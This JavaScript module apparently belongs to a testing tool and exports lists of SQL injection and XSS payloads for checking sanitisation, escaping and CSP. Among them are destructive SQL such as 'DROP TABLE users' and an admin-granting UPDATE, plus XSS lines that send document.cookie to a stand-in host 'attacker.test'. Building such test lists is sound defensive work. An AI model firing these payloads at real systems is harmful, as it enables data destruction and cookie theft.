export const SECURITY_PAYLOAD_CATEGORIES = {
  sqli: {
    label: "SQL Injection",
    description: "Payloads para validar sanitizacao, escaping e prepared statements.",
    payloads: [
      "' OR '1'='1",
      "\" OR \"1\"=\"1",
      "' OR 1=1 --",
      "' OR 1=1#",
      "' OR 1=1/*",
      "' OR 'a'='a",
      "' UNION SELECT NULL --",
      "' UNION SELECT NULL,NULL --",
      "' UNION SELECT username,password FROM users --",
      "admin' --",
      "admin' #",
      "admin'/*",
      "'; DROP TABLE users; --",
      "'; UPDATE users SET role='admin' WHERE username='qa'; --",
      "' AND SLEEP(5) --",
      "' OR IF(1=1,SLEEP(5),0) --",
      "' OR pg_sleep(5) --",
      "' OR 1=1 LIMIT 1 --",
      "1 OR 1=1",
      "' OR ''='"
    ]
  },
  xss: {
    label: "XSS",
    description: "Payloads para validar encode de saida, CSP e bloqueio de scripts injetados.",
    payloads: [
      "<script>alert('xss')</script>",
      "\"><script>alert('xss')</script>",
      "<img src=x onerror=alert('xss')>",
      "<svg onload=alert('xss')>",
      "<body onload=alert('xss')>",
      "<iframe src=javascript:alert('xss')></iframe>",
      "<a href=\"javascript:alert('xss')\">click</a>",
      "<input autofocus onfocus=alert('xss')>",
      "<details open ontoggle=alert('xss')>",
      "<video><source onerror=\"javascript:alert('xss')\"></video>",
      "<math><mi xlink:href=\"data:x,<script>alert('xss')</script>\"></mi></math>",
      "{{constructor.constructor('alert(1)')()}}",
      "<div onpointerover=alert('xss')>hover</div>",
      "';alert(String.fromCharCode(88,83,83))//",
      "<img src=\"x\" onerror=\"fetch('https://attacker.test/'+document.cookie)\">",
      "<script>document.location='https://attacker.test?c='+document.cookie</script>",
      "<scr<script>ipt>alert('xss')</scr</script>ipt>",
      "<svg><script>alert('xss')</script></svg>",
      "<object data=\"javascript:alert('xss')\"></object>",
      "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss')\">"
    ]
  }
};

export const SECURITY_TYPE_OPTIONS = [
  { value: "all", label: "Todos" },
  { value: "sqli", label: "SQL Injection" },
  { value: "xss", label: "XSS" }
];
